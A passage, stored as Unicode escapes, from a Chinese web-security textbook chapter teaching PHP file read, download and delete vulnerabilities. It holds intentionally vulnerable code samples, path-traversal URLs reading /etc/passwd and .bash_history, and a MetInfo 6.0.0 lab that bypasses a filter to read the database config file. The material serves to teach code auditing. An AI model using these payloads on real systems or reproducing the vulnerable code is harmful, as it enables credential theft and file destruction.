  \u8BF7\u6C42\u6210\u529F\u540E\uFF0C\u5C06\u521B\u5EFA\u4E00\u4E2A\u6587\u4EF6\u540D\u79F0\u4E3Ashell.php\u6587\u4EF6\uFF0C\u4EE3\u7801\u5185\u5BB9\u663E\u793Aphp\u4FE1\u606F\u3002\u4F7F\u7528\u6D4F\u89C8\u5668\u8BBF\u95EE\u751F\u6210\u7684shell\u6587\u4EF6\uFF0C\u8DEF\u5F84\u4E3Ahttp://ip/templates/shell.php\uFF0C\u9875\u9762\u663E\u793A\u6548\u679C\u5982\u56FE8-11\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image438.jpg)\r
\r
\`\`\`\r
\u56FE8-11 \u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u6D4B\u8BD5\u56FE\r
\`\`\`\r
\r
## 8.3 \u6587\u4EF6\u8BFB\u53D6\uFF08\u4E0B\u8F7D\uFF09\u6F0F\u6D1E\u6316\u6398\u4E0E\u5B9E\u8DF5\r
\r
### 8.3.1 \u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\u7B80\u4ECB\r
\r
\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\u5C5E\u4E8E\u6587\u4EF6\u64CD\u4F5C\u6F0F\u6D1E\u7684\u7684\u4E00\u79CD\u65B9\u5F0F\uFF0C\u6B64\u7C7B\u6F0F\u6D1E\u5728\u5F88\u591A\u5927\u578B\u5E94\u7528\u4E0A\u90FD\u51FA\u73B0\u8FC7\u3002\u8BE5\u6F0F\u6D1E\u5F88\u5BB9\u6613\u7406\u89E3\uFF0C\u90E8\u5206\u7A0B\u5E8F\u5728\u8BFB\u53D6\u663E\u793A\u6587\u4EF6\u7684\u65F6\u5019\uFF0CHTTP\u8BF7\u6C42\u4F20\u9012\u7684\u8BFB\u53D6\u6587\u4EF6\u53C2\u6570\uFF08filename\uFF09\u76F4\u63A5\u5728\u8BF7\u6C42\u91CC\u9762\u4F20\u9012\uFF0C\u540E\u53F0\u7A0B\u5E8F\u83B7\u53D6\u5230\u8FD9\u4E2A\u6587\u4EF6\u8DEF\u5F84\u540E\u76F4\u63A5\u8BFB\u53D6\u5E76\u663E\u793A\u81F3\u6D4F\u89C8\u5668\u9875\u9762\u3002\u8BE5\u6F0F\u6D1E\u53EF\u76F4\u63A5\u5BFC\u81F4\u8BFB\u53D6\u6570\u636E\u5E93\u914D\u7F6E\u6587\u4EF6\uFF0C\u4E25\u91CD\u7684\u8BDD\u8FD8\u53EF\u5BFC\u81F4\u670D\u52A1\u5668\u7AEF\u8BF7\u6C42\u4F2A\u9020\u6F0F\u6D1E(SSRF\u6F0F\u6D1E\uFF0C\u8BE5\u6F0F\u6D1E\u662F\u4E00\u79CD\u7531\u653B\u51FB\u8005\u6784\u9020\u5F62\u6210\u7531\u670D\u52A1\u5668\u53D1\u8D77\u8BF7\u6C42\u7684\u4E00\u79CD\u5B89\u5168\u6F0F\u6D1E)\u4ECE\u800C\u6F2B\u6E38\u81F3\u5185\u7F51\u3002\r
\r
\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\u9700\u8981\u7684\u524D\u63D0\u6761\u4EF6\u5305\u62EC\uFF1A\r
\r
l \u5E94\u7528\u7A0B\u5E8F\u4E2D\u5B58\u5728\u8BFB\u53D6\u6587\u4EF6\u51FD\u6570\uFF1B\r
\r
l \u8BFB\u53D6\u6587\u4EF6\u8DEF\u5F84\u53C2\u6570\u53EF\u63A7\u6216\u5BF9\u53C2\u6570\u4F20\u9012\u8FC7\u6EE4\u4E0D\u4E25\u683C\uFF1B\r
\r
l \u6D4F\u89C8\u5668\u53EF\u663E\u793A\u6587\u4EF6\u5185\u5BB9\u3002\r
\r
\u4E0B\u9762\u7ED9\u51FA\u6587\u4EF6\u8BFB\u53D6\u7684\u4EE3\u7801\u6848\u4F8B\uFF1A\r
\r
\r
\r
<?php\r
\r
$filename=$_GET['f'];\r
\r
echo file_get_contents($filename);\r
\r
?>\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u76F4\u63A5\u901A\u8FC7HTTP\u7684GET\u65B9\u6CD5\u4F20\u9012\u53C2\u6570f\uFF0C\u5E76\u663E\u793A\u6587\u4EF6\u5185\u5BB9\u5982\u56FE8-12\u6240\u793A\uFF0C\u8BBF\u95EE\u8DEF\u5F84http://ip/readfile.php?f=../../../../../etc/passwd\uFF0C\u663E\u793ALinux\u7CFB\u7EDF\u7684/etc/passwd\u6587\u4EF6\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image440.jpg)\r
\r
\`\`\`\r
\u56FE8-12 \u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\u6D4B\u8BD5\u56FE\r
\`\`\`\r
\r
### 8.3.2 \u6587\u4EF6\u4E0B\u8F7D\u6F0F\u6D1E\u7B80\u4ECB\r
\r
\u6587\u4EF6\u4E0B\u8F7D\u6F0F\u6D1E\u4E0E\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\u7C7B\u4F3C\u3002\u4E00\u4E9B\u7F51\u7AD9\u7531\u4E8E\u4E1A\u52A1\u9700\u6C42\uFF0C\u5F80\u5F80\u9700\u8981\u63D0\u4F9B\u6587\u4EF6\u4E0B\u8F7D\u529F\u80FD\uFF0C\u4F46\u82E5\u5BF9\u7528\u6237\u4E0B\u8F7D\u7684\u6587\u4EF6\u4E0D\u505A\u9650\u5236\uFF0C\u5219\u6076\u610F\u7528\u6237\u5C31\u80FD\u591F\u4E0B\u8F7D\u4EFB\u610F\u654F\u611F\u6587\u4EF6\uFF0C\u8FD9\u5C31\u662F\u6587\u4EF6\u4E0B\u8F7D\u6F0F\u6D1E\u3002\r
\r
\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\u9700\u8981\u7684\u524D\u63D0\u6761\u4EF6\u5305\u62EC\uFF1A\r
\r
l \u5E94\u7528\u7A0B\u5E8F\u4E2D\u5B58\u5728\u8BFB\u53D6\u6587\u4EF6\u51FD\u6570\uFF1B\r
\r
l \u8BFB\u53D6\u6587\u4EF6\u8DEF\u5F84\u53C2\u6570\u53EF\u63A7\u6216\u5BF9\u53C2\u6570\u4F20\u9012\u8FC7\u6EE4\u4E0D\u4E25\u683C\uFF1B\r
\r
l \u6D4F\u89C8\u5668\u53EF\u663E\u793A\u6587\u4EF6\u5185\u5BB9\u3002\r
\r
\u4E0B\u9762\u7ED9\u51FA\u6587\u4EF6\u4E0B\u8F7D\u7684\u4EE3\u7801\u6848\u4F8B\uFF1A\r
\r
\r
\r
<?php\r
\r
$filename = $_GET['f'];\r
\r
echo '<h1>\u5F00\u59CB\u4E0B\u8F7D\u6587\u4EF6\uFF01</h1><br /><br />';\r
\r
echo file_get_contents($filename);\r
\r
header('Content-Type: image/jpeg');\r
\r
header('Content-Disposition: attachment; filename='.$filename);\r
\r
header('Content-Lengh: '.filesize($filename));\r
\r
?>\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u76F4\u63A5\u901A\u8FC7HTTP\u7684GET\u65B9\u6CD5\u4F20\u9012\u53C2\u6570f\uFF0C\u5E76\u4E0B\u8F7D\u6587\u4EF6\u5185\u5BB9\u5982\u56FE8-13\u6240\u793A\uFF0C\u8BBF\u95EE\u8DEF\u5F84http://ip/readfile.php?f=../../../../root/.bash_history\uFF0C\u663E\u793ALinux\u7CFB\u7EDF\u7684\u7528\u6237\u547D\u4EE4\u8BB0\u5F55\u6587\u4EF6\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image442.jpg)\r
\r
\`\`\`\r
\u56FE8-13 \u6587\u4EF6\u4E0B\u8F7D\u6F0F\u6D1E\u6D4B\u8BD5\u56FE\r
\`\`\`\r
\r
### 8.3.3 \u6587\u4EF6\u8BFB\u53D6\uFF08\u4E0B\u8F7D\uFF09\u6F0F\u6D1E\u6316\u6398\u7ECF\u9A8C\r
\r
\u4ECE\u7F51\u7AD9\u529F\u80FD\u8FDB\u884C\u5BA1\u8BA1\u800C\u8A00\uFF0C\u6587\u4EF6\u8BFB\u53D6\uFF08\u4E0B\u8F7D\uFF09\u6F0F\u6D1E\u53EF\u4F7F\u7528\u9ED1\u76D2\u6D4B\u8BD5\u89C2\u5BDF\u7F51\u7AD9\u4E2D\u5B58\u5728\u6587\u4EF6\u8BFB\u53D6\u4E0E\u4E0B\u8F7D\u7684\u7F51\u7AD9\u529F\u80FD\u70B9\u4F4D\u7F6E\uFF0C\u5C1D\u8BD5\u4FEE\u6539HTTP\u4F20\u9012\u7684\u6587\u4EF6\u540D\u53C2\u6570\uFF0C\u6D4B\u8BD5\u662F\u5426\u5B58\u5728\u6587\u4EF6\u8BFB\u53D6\uFF08\u4E0B\u8F7D\uFF09\u6F0F\u6D1E\u3002\r
\r
\u5BF9\u4E8E\u8BE5\u6F0F\u6D1E\u9632\u5FA1\u8F83\u5F3A\u7684\u7F51\u7AD9\u5E94\u7528\u800C\u8A00\uFF0C\u4F9D\u65E7\u5EFA\u8BAE\u4F7F\u7528\u767D\u76D2\u5BA1\u8BA1\u7684\u65B9\u5F0F\uFF0C\u5BF9\u6587\u4EF6\u8BFB\u53D6\uFF08\u4E0B\u8F7D\uFF09\u6F0F\u6D1E\u7684\u5E38\u89C1\u51FD\u6570\u8FDB\u884C\u5168\u5C40\u641C\u7D22\uFF0C\u4F7F\u7528\u654F\u611F\u51FD\u6570\u53C2\u6570\u56DE\u6EAF\u6CD5\u786E\u5B9A\u8BFB\u53D6\uFF08\u4E0B\u8F7D\uFF09\u6587\u4EF6\u51FD\u6570\u4F20\u9012\u7684\u53C2\u6570\u662F\u5426\u5B58\u5728\u76F4\u63A5\u6216\u95F4\u63A5\u7684\u53EF\u63A7\u53D8\u91CF\u3002PHP\u4EE3\u7801\u7684\u6587\u4EF6\u8BFB\u53D6\uFF08\u4E0B\u8F7D\uFF09\u6F0F\u6D1E\u5E38\u89C1\u51FD\u6570\u5305\u62EC\uFF1A\r
\r
l file_get_contents\u51FD\u6570\uFF1A\u628A\u6574\u4E2A\u6587\u4EF6\u8BFB\u5165\u4E00\u4E2A\u5B57\u7B26\u4E32\u4E2D\uFF1B\r
\r
l fopen\u51FD\u6570\uFF1A\u6253\u5F00\u6587\u4EF6\u6216\u8005URL\u8DEF\u5F84\uFF0C\u5982\u679C\u6253\u5F00\u5931\u8D25\u5219\u8FD4\u56DEFalse\uFF1B\r
\r
l highlight_file\u51FD\u6570\uFF1A\u5BF9\u6587\u4EF6\u8FDB\u884C\u8BED\u6CD5\u9AD8\u4EAE\u663E\u793A\uFF1B\r
\r
l fread\u51FD\u6570\uFF1A\u8BFB\u53D6\u6587\u4EF6\uFF08\u53EF\u5B89\u5168\u7528\u4E8E\u4E8C\u8FDB\u5236\u6587\u4EF6\uFF09\uFF1B\r
\r
l readfile\u51FD\u6570\uFF1A\u8BFB\u53D6\u4E00\u4E2A\u6587\u4EF6\u5E76\u5199\u5165\u5230\u8F93\u51FA\u7F13\u51B2\u3002\u5982\u679C\u6210\u529F\uFF0C\u8BE5\u51FD\u6570\u8FD4\u56DE\u4ECE\u6587\u4EF6\u4E2D\u8BFB\u5165\u7684\u5B57\u8282\u6570\u3002\u5982\u679C\u5931\u8D25\uFF0C\u8BE5\u51FD\u6570\u8FD4\u56DEFALSE\u5E76\u9644\u5E26\u9519\u8BEF\u4FE1\u606F\u3002\r
\r
\u5176\u4ED6\u9700\u8981\u6CE8\u610F\u7684\u51FD\u6570\u8FD8\u5305\u62EC\uFF1Afgetss()\u3001fgets()\u3001parse_ini_file()\u3001file()\u3001show_source()\u3002\u5FEB\u901F\u6316\u6398\u6587\u4EF6\u5199\u5165\u6F0F\u6D1E\u53EA\u9700\u5168\u5C40\u641C\u7D22\u4E0A\u8FF0\u8FD9\u4E9B\u51FD\u6570\u540D\uFF0C\u5B9A\u4F4D\u9700\u8981\u5BA1\u8BA1\u7684\u4EE3\u7801\u4F4D\u7F6E\uFF0C\u540C\u65F6\u5BA1\u8BA1\u8BE5\u51FD\u6570\u7684\u53C2\u6570\u662F\u5426\u53EF\u63A7\u4E0E\u8FC7\u6EE4\u60C5\u51B5\u3002\u9664\u4E86\u4E0A\u8FF0\u8FD9\u4E9B\u51FD\u6570\u5916\uFF0C\u8FD8\u53EF\u4EE5\u4F7F\u7528PHP\u7684file://\u4F2A\u534F\u8BAE\u6765\u8BFB\u53D6\u6587\u4EF6\u3002\r
\r
### 8.3.4 \u5B9E\u9A8C\uFF1AMetInfo6.0.0\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\u5BA1\u8BA1\r
\r
\xB7 \u5B9E\u9A8C\u4ECB\u7ECD\r
\r
\u672C\u5B9E\u9A8C\u5C06\u5BF9MetInfo6.0.0\u7248\u884C\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u4F5C\uFF0C\u5BA1\u8BA1\u8BE5CMS\u4E2D\u662F\u5426\u5B58\u5728\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\u3002\u5728MetInfo6.0.0\u7248\u672C\u4E2Dapp\\system\\include\\module\\old_thumb.class.php\u7591\u4F3C\u6709\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\uFF0C\u5BFC\u81F4\u653B\u51FB\u8005\u53EF\u4EE5\u8BFB\u53D6\u4EFB\u610F\u6587\u4EF6\u3002\r
\r
\xB7 \u9884\u5907\u77E5\u8BC6\r
\r
\u53C2\u80038.3.1\u8282\uFF1A\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\u7B80\u4ECB\uFF1B8.3.3\u8282\uFF1A\u6587\u4EF6\u8BFB\u53D6\uFF08\u4E0B\u8F7D\uFF09\u6F0F\u6D1E\u6316\u6398\u7ECF\u9A8C\u3002\r
\r
\xB7 \u5B9E\u9A8C\u76EE\u7684\r
\r
\u638C\u63E1\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u65B9\u6CD5\u3002\r
\r
\xB7 \u5B9E\u9A8C\u73AF\u5883\r
\r
Windows\u64CD\u4F5C\u7CFB\u7EDF\u4E3B\u673A\uFF1BMeInfo 6.0.0\u5B89\u88C5\u5305\uFF1BPhpStorm\u5DE5\u5177\u3002\r
\r
\xB7 \u5B9E\u9A8C\u6B65\u9AA4\r
\r
\uFF081\uFF09  \u5BA1\u8BA1\u9636\u6BB5\r
\r
\u5BF9MetInfo\u5168\u5C40\u641C\u7D22\u6587\u4EF6\u5199\u5165\u6F0F\u6D1E\u7684\u5E38\u89C1\u51FD\u6570readfile\uFF0C\u5982\u4E0B\u56FE8-14\u6240\u793A\u3002\u5BA1\u8BA1\u51FD\u6570readfile\u7684\u53C2\u6570\u4F20\u9012\u8FC7\u7A0B\uFF0C\u662F\u5426\u5B58\u5728\u7ED5\u8FC7\u8FC7\u6EE4\u7684\u60C5\u51B5\u3002\u672CCMS\u4E2Dold_thumb.class.php\u6587\u4EF6\u7684\u7B2C18\u884C\u5B58\u5728readfile\u51FD\u6570\u4F20\u53C2$dir\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image444.jpg)\r
\r
\`\`\`\r
\u56FE8-14 \u5168\u5C40\u641C\u7D22readfile\u56FE\r
\`\`\`\r
\r
\u5BF9old_thumb.class.php\u6587\u4EF6\u8FDB\u884C\u5BA1\u8BA1\uFF0C\u9875\u9762\u5EFA\u7ACBold_thumb \u7C7B\uFF0C\u5E76\u521B\u5EFAdoshow\u65B9\u6CD5\uFF0C\u8BE5\u65B9\u6CD5\u6D41\u7A0B\uFF1A\r
\r
l \u9996\u5148\u5C06../\u548C./\u7279\u6B8A\u5B57\u7B26\u66FF\u6362\u4E3A\u7A7A\u5B57\u7B26\uFF1B\r
\r
l \u8981\u6C42\u5B57\u7B26\u5FC5\u987B\u4EE5HTTP\u5F00\u5934\uFF0C\u5E76\u4E14\u4E0D\u80FD\u6709./\u5B57\u7B26\uFF1B\r
\r
l \u8C03\u7528readfile\u51FD\u6570\u8BFB\u53D6\u6587\u4EF6\u5185\u5BB9\uFF0C\u4EE3\u7801\u5185\u5BB9\u5982\u4E0B\uFF1A\r
\r
\r
\r
class old_thumb extends web{\r
    public function doshow(){\r
     global $_M;\r
\r
//\u66FF\u6362\u7279\u6B8A\u5B57\u7B26../\u548C./\u4E3A\u7A7A\u5B57\u7B26\r
     $dir = **str_replace(array('../','./'), '', $_GET['dir']);**\r
\r
**//\u5B57\u7B26\u4E32\u4EE5http\u5F00\u5934\uFF0C\u4E14\u8DEF\u5F84\u4E0D\u80FD\u5305\u542B./\u5B57\u7B26**\r
     if(**substr(str_replace($_M['url']['site'], '', $dir),0,4)\r
       == 'http'** && **strpos($dir, './') === false**){\r
       header("Content-type: image/jpeg");\r
       ob_start();\r
\r
//\u6839\u636E\u6587\u4EF6\u8DEF\u5F84\u8BFB\u53D6\u6587\u4EF6\r
       **readfile($dir);**\r
       ob_flush();\r
       flush();\r
       die; }\r
\r
\u2026\u7701\u7565\u2026\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u770B\u4F3C\u8FC7\u6EE4\u975E\u5E38\u5B8C\u7F8E\uFF0C\u4F46\u662F\u4F9D\u7136\u80FD\u591F\u7ED5\u8FC7\uFF0CWindows\u64CD\u4F5C\u7CFB\u7EDF\u4E0B\u53EF\u4EE5\u4F7F\u7528..\\\u7ED5\u8FC7\u4E0A\u8FF0\u8FC7\u6EE4\u3002\r
\r
\uFF082\uFF09  \u786E\u5B9A\u8BE5\u529F\u80FD\u8BBF\u95EE\u6D41\u7A0B\r
\r
\u5BF9\u8BE5CMS\u7684\u8C03\u7528\u6D41\u7A0B\u8FDB\u884C\u57FA\u672C\u4E86\u89E3\uFF0C\u4ECE\u800C\u786E\u5B9A\u5982\u4F55\u89E6\u53D1\u4E0A\u8FF0\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\u3002\u5F53\u8F93\u5165URL\u4E3A\uFF1Ahttp://[ip]/include/thumb.php?dir=xxx\u65F6\uFF0C\u7A0B\u5E8F\u9996\u5148\u8C03\u7528include\\thumb.php\u6587\u4EF6\uFF0C\u8BE5\u6587\u4EF6\u4F1A\u521D\u59CB\u5316old_thumb\u7C7B\u5E76\u8C03\u7528\u8BE5\u7C7B\u4E2D\u7684doshow\u65B9\u6CD5\uFF0C\u7136\u540E\u624D\u8C03\u7528old_thump.class.php\u6587\u4EF6\u7684doshow\u65B9\u6CD5\u5E76\u6267\u884Creadfile\u51FD\u6570\u8BFB\u53D6\u6587\u4EF6\u3002\r
\r
\u81F3\u6B64\u5DF2\u5BF9\u8BE5\u7CFB\u7EDF\u7684\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\u7684\u6D41\u7A0B\u8FDB\u884C\u4E86\u89E3\uFF0C\u901A\u8FC7\u5BF9\u6587\u4EF6\u8BFB\u53D6\u7684\u8DEF\u5F84\u8FC7\u6EE4\u4E0D\u4E25\u683C\uFF0C\u4ECE\u800C\u5BFC\u81F4\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\uFF0C\u5176\u8C03\u7528\u6D41\u7A0B\u5982\u56FE8-15\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image446.jpg)\r
\r
\`\`\`\r
\u56FE8-15 \u8C03\u7528\u6D41\u7A0B\u56FE\r
\`\`\`\r
\r
\uFF083\uFF09  \u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\u5229\u7528\r
\r
\u4F7F\u7528BurpSuite\u6293\u53D6HTTP\u8BF7\u6C42\uFF0C\u8BBE\u7F6E\u4EE3\u7406Proxy\u540C\u65F6\u6293\u53D6\u5BA2\u6237\u7AEF\u8BF7\u6C42\u548C\u670D\u52A1\u5668\u54CD\u5E94\uFF0C\u8BBE\u7F6E\u5982\u56FE8-16\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image448.jpg)\r
\r
\`\`\`\r
\u56FE8-16 burpsuite\u914D\u7F6E\u56FE\r
\`\`\`\r
\r
\u4F7F\u7528\u6D4F\u89C8\u5668\u8BBF\u95EEURL\uFF1Ahttp://[ip]//include/thumb.php?dir=http\\..\\..\\config\\config_db.php\u3002\u6B64\u65F6BurpSuite\u6293\u5230\u4E86\u8BE5\u8BF7\u6C42\u5305\uFF0C\u70B9\u51FBForward\u6309\u94AE\u5C06\u8FD9\u4E2A\u8BF7\u6C42\u5305\u653E\u8FC7\uFF0CBurpSuite\u5219\u4F1A\u6293\u5230\u670D\u52A1\u5668\u7684\u54CD\u5E94\u5305\u3002\u5728BurpSuite\u8F6F\u4EF6\u754C\u9762\u9009\u62E9Proxy->HTTP history\u6807\u7B7E\u9875\uFF0C\u67E5\u770B\u62E6\u622A\u7684\u6570\u636E\u5305\uFF0C\u5982\u56FE8-17\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image450.jpg)\r
\r
\`\`\`\r
\u56FE8-17 burpsuite\u6293\u53D6\u6570\u636E\u5305\r
\`\`\`\r
\r
\u54CD\u5E94\u5305\u7684\u5185\u5BB9\u4E2D\u5219\u5305\u542B\u4E86config_db\uFF08\u7F51\u7AD9\u7684\u6570\u636E\u5E93\u914D\u7F6E\u6587\u4EF6\uFF09\u5185\u5BB9\uFF0C\u5982\u56FE8-18\u6240\u793A\u3002\u53EF\u4EE5\u53D1\u73B0config_db\u6587\u4EF6\u8BFB\u53D6\u6210\u529F\uFF0C\u5F53\u524D\u6570\u636E\u5E93\u7528\u6237\u540D\u5BC6\u7801\u5747\u4E3Aroot\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image452.jpg)\r
\r
\u56FE8-18 \u6587\u4EF6\u8BFB\u53D6\u6D4B\u8BD5\u56FE\r
\r
## 8.4 \u6587\u4EF6\u5220\u9664\u6F0F\u6D1E\u6316\u6398\u4E0E\u5B9E\u8DF5\r
\r
### 8.4.1 \u6587\u4EF6\u5220\u9664\u6F0F\u6D1E\u7B80\u4ECB\r
\r
\u6587\u4EF6\u5220\u9664\u6F0F\u6D1E\u5C5E\u4E8E\u6587\u4EF6\u64CD\u4F5C\u6F0F\u6D1E\u7684\u7684\u4E00\u79CD\u65B9\u5F0F\uFF0C\u6B64\u7C7B\u6F0F\u6D1E\u7ECF\u5E38\u51FA\u73B0\u5728\u5177\u6709\u6587\u4EF6\u7BA1\u7406\u529F\u80FD\u7684\u7F51\u7AD9\u7A0B\u5E8F\u4E0A\u3002\u5176\u539F\u7406\u548C\u6587\u4EF6\u4E0A\u6587\u63D0\u5230\u7684\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\u7C7B\u4F3C\uFF0C\u90E8\u5206\u7A0B\u5E8F\u5728\u5220\u9664\u6587\u4EF6\u7684\u65F6\u5019\uFF0CHTTP\u8BF7\u6C42\u4F20\u9012\u7684\u5220\u9664\u6587\u4EF6\u540D\u79F0\u53C2\u6570\uFF08filename\uFF09\uFF0C\u540E\u53F0\u7A0B\u5E8F\u83B7\u53D6\u5230\u8FD9\u4E2A\u6587\u4EF6\u8DEF\u5F84\u540E\u76F4\u63A5\u5220\u9664\u670D\u52A1\u5668\u4E0B\u67D0\u4E2A\u6587\u4EF6\u3002\r
\r
\u4EFB\u610F\u6587\u4EF6\u5220\u9664\u6F0F\u6D1E\u9700\u8981\u7684\u524D\u63D0\u6761\u4EF6\u5305\u62EC\uFF1A\r
\r
l \u5E94\u7528\u7A0B\u5E8F\u4E2D\u5B58\u5728\u5220\u9664\u6587\u4EF6\u51FD\u6570\uFF1B\r
\r
l \u5220\u9664\u6587\u4EF6\u8DEF\u5F84\u53C2\u6570\u53EF\u63A7\u6216\u5BF9\u53C2\u6570\u4F20\u9012\u8FC7\u6EE4\u4E0D\u4E25\u683C\uFF0C\u53EF\u4F7F\u7528\u201C./\u201D\u8DF3\u8F6C\u8DEF\u5F84\uFF1B\r
\r
l \u672A\u5BF9\u6587\u4EF6\u6743\u9650\u8FDB\u884C\u4E25\u683C\u9650\u5236\u3002\r
\r
\u4E0B\u9762\u7ED9\u51FA\u6587\u4EF6\u8BFB\u53D6\u7684\u4EE3\u7801\u6848\u4F8B\uFF1A\r
\r
\r
\r
<?php\r
\r
//\u5224\u65ADfileUrl\u662F\u5426\u8BBE\u7F6E\u503C\uFF0C\u82E5\u672A\u8BBE\u7F6E\u5219\u8D4B\u503C\u4E3A../uploads/test.txt\r
\r
$fileUrl = isset($_GET['fileUrl'])?$_GET['fileUrl']:'../uploads/test.txt';\r
\r
//\u5224\u65ADfileUrl\u662F\u5426\u5B58\u5728\r
\r
if(file_exists($fileUrl)){\r
\r
  echo "1";\r
\r
}else{\r
\r
  echo $fileUrl;}\r
\r
//\u5982\u679CfileUrl\u5B58\u5728\u4E14fileUrl\u662F\u6587\u4EF6\u5219\u6839\u636E\u6587\u4EF6\u8DEF\u5F84\u5220\u9664\u6587\u4EF6\r
\r
if($fileUrl and is_file($fileUrl)){\r
\r
  @unlink($fileUrl);}\r
\r
?>\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u76F4\u63A5\u901A\u8FC7HTTP\u7684GET\u65B9\u6CD5\u4F20\u9012\u53C2\u6570fileUrl\uFF0C\u8BE5\u53C2\u6570\u4E3A\u6307\u5B9A\u5220\u9664\u7684\u6587\u4EF6\u8DEF\u5F84\uFF0C\u8BBF\u95EE\u8DEF\u5F84http://ip/deleteFile.php?fileUrl=db.sql\u5219\u82E5\u6210\u529F\u5219\u672C\u5730\u6D4B\u8BD5\u6253\u53701\uFF0C\u5982\u56FE8-19\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image454.gif)\r
\r
\u56FE8-19\u6587\u4EF6\u5220\u9664\u6D4B\u8BD5\u56FE\r
\r
### 8.4.2 \u6587\u4EF6\u5220\u9664\u6F0F\u6D1E\u6316\u6398\u7ECF\u9A8C\r
\r
\u6587\u4EF6\u5220\u9664\u7684\u6F0F\u6D1E\u6316\u6398\u91C7\u7528\u9ED1\u76D2\u6D4B\u8BD5\u4E0E\u767D\u76D2\u5BA1\u8BA1\u7ED3\u5408\u7684\u65B9\u5F0F\u3002\u4F7F\u7528\u9ED1\u76D2\u6D4B\u8BD5\u5BF9\u4E8E\u7F51\u7AD9\u4E2D\u5B58\u5728\u6587\u4EF6\u5220\u9664\u7684\u529F\u80FD\u70B9\u8FDB\u884C\u6D4B\u8BD5\uFF0C\u5C1D\u8BD5\u4FEE\u6539\u6587\u4EF6\u540D\u53C2\u6570\u6D4B\u8BD5\u80FD\u5426\u5220\u9664\u4EFB\u610F\u6587\u4EF6\uFF0C\u8BE5\u65B9\u6CD5\u53EF\u8FC5\u901F\u5B9A\u4F4D\u6587\u4EF6\u5220\u9664\u6F0F\u6D1E\u95EE\u9898\u3002\r
\r
\u5982\u679C\u65E0\u6CD5\u5220\u9664\u4EFB\u610F\u6587\u4EF6\uFF0C\u5219\u9700\u8981\u5BF9\u8BE5\u7F51\u7AD9\u8FDB\u884C\u767D\u76D2\u5BA1\u8BA1\uFF0C\u5BF9\u6587\u4EF6\u5220\u9664\u6F0F\u6D1E\u7684\u5E38\u89C1\u51FD\u6570\u8FDB\u884C\u5168\u5C40\u641C\u7D22\uFF0C\u4F7F\u7528\u654F\u611F\u51FD\u6570\u53C2\u6570\u56DE\u6EAF\u6CD5\u786E\u5B9A\u5220\u9664\u6587\u4EF6\u51FD\u6570\u4F20\u9012\u7684\u53C2\u6570\u662F\u5426\u5B58\u5728\u53EF\u63A7\u53D8\u91CF\u3002PHP\u4EE3\u7801\u7684\u6587\u4EF6\u5220\u9664\u6F0F\u6D1E\u5E38\u89C1\u51FD\u6570\u5305\u62EC\uFF1A\r
\r
l unlink\u51FD\u6570\uFF1A\u5220\u9664\u6587\u4EF6\u51FD\u6570\uFF0C\u82E5\u5220\u9664\u6210\u529F\u8FD4\u56DETrue\uFF0C\u5220\u9664\u5931\u8D25\u5219\u8FD4\u56DEFalse\uFF1B\r
\r
### 8.4.3 \u5B9E\u9A8C\uFF1A74CMS3.0\u6587\u4EF6\u5220\u9664\u6F0F\u6D1E\u5BA1\u8BA1\r
\r
\xB7 \u5B9E\u9A8C\u4ECB\u7ECD\r
\r
\u672C\u5B9E\u9A8C\u5C06\u5BF974CMS\u7684V3.0\u7248\u672C\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u4F5C\uFF0C\u5BA1\u8BA1\u8BE5CMS\u4E2D\u662F\u5426\u5B58\u5728\u4EFB\u610F\u6587\u4EF6\u5220\u9664\u6F0F\u6D1E\u3002\u572874CMS V3.0\u7248\u672C\u4E2D\u7BA1\u7406\u7CFB\u7EDF\u7684\u5185\u5BB9\u7BA1\u7406\u529F\u80FD\u5B58\u5728\u5BF9\u5220\u9664\u6587\u4EF6\u540D\u8FC7\u6EE4\u4E0D\u4E25\uFF0C\u5BFC\u81F4\u653B\u51FB\u8005\u53EF\u4EE5\u4EFB\u610F\u5220\u9664\u6587\u4EF6\uFF0C\u7F16\u8F91\u6A21\u677F\u7684\u6587\u4EF6\u662F/admin/admin_article.php\u3002\r
\r
\xB7 \u9884\u5907\u77E5\u8BC6\r
\r
